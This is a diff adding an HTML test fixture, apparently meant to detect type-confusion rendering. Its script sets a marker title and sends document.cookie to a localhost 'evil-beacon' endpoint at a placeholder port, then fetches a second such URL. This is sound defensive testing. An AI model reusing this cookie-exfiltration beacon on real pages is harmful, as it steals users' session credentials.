@@ -1,0 +1,8 @@
+<!doctype html><html><body>
+<h1>IF YOU SEE THIS AS A PAGE, TYPE CONFUSION SUCCEEDED</h1>
+<script>
+  document.title = "EVIL_EXECUTED";
+  try { new Image().src = "http://127.0.0.1:__EXTPORT__/x/evil-beacon?c=" + encodeURIComponent(document.cookie); } catch(e){}
+  try { fetch("http://127.0.0.1:__EXTPORT__/x/evil-fetch"); } catch(e){}
+</script>
+</body></html>
